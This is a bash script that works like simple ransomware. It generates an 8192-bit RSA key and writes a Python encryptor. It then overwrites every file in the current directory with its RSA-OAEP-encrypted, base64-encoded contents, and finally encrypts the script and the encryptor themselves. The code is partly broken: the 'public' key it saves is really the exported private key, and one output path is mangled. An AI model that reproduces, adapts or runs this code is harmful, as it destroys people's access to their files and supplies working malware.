#!/usr/bin/env /bin/bash

/usr/bin/ls -l | /usr/bin/awk 'NR > 1 {print $9}' |  /usr/bin/grep -vE 'file.sh' > file_names.txt


#############################
##choose random prime here ##
#############################

/usr/bin/cat << EOF > rsa_gen.py

#!/usr/bin/env /usr/bin/python3

from Cryptodome.PublicKey import RSA

new_key = RSA.generate(8192, e=65537)
private_key = new_key.exportKey("PEM")
public_key = new_key.exportKey("PEM")
fd = open("private_key.pem", "wb")
fd.write(private_key)
fd.close()
fd = open("public_key.pem", "wb")
fd.write(public_key)
fd.close()

EOF

/usr/bin/python3 rsa_gen.py


/usr/bin/cat << EOF > rsa_encryptor.py

#!/usr/bin/env /usr/bin/python3

import zlib
import base64
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from pathlib import Path

def encrypt_blob(blob, public_key):
	rsa_key = RSA.importKey(public_key)
	rsa_key = PKCS1_OAEP.new(rsa_key)
	blob = zlib.compress(blob)
	chunk_size = 470
	offset = 0
	end_loop = False
	encrypted = bytearray()

	while not end_loop:
		chunk = blob[offset:offset + chunk_size]
		if len(chunk) % chunk_size != 0:
			end_loop = True
			chunk += bytes(chunk_size - len(chunk))
		encrypted += rsa_key.encrypt(chunk)
		offset += chunk_size
	return base64.b64encode(encrypted)

public_key = open('public_key.pem').read()

EOF


for line in `/usr/bin/cat file_names.txt`;
do

/usr/bin/cat << EOF >> rsa_encryptor.py

unencrypted_file_name = Path("$line")
encrypted_file = unencrypted_file_name.with_suffix('.dat')
encrypted_blob = encrypt_blob(unencrypted_file_name.read_bytes(), public_key)
fd = open("$line", "wb")
fd.write(encrypted_blob)
fd.close()

EOF

done

/usr/bin/cat << EOF >> rsa_encryptor.py

unencrypted_file_name = Path("file.sh")
encrypted_file = unencrypted_file_name.with_suffix('.dat')
encrypted_blob = encrypt_blob(unencrypted_file_name.read_bytes(), public_key)
fd = open("$file.sh", "wb")
fd.write(encrypted_blob)
fd.close()

unencrypted_file_name = Path("rsa_encryptor.py")
encrypted_file = unencrypted_file_name.with_suffix('.dat')
encrypted_blob = encrypt_blob(unencrypted_file_name.read_bytes(), public_key)
fd = open("rsa_encryptor.py", "wb")
fd.write(encrypted_blob)
fd.close()

EOF

/usr/bin/python3 rsa_encryptor.py
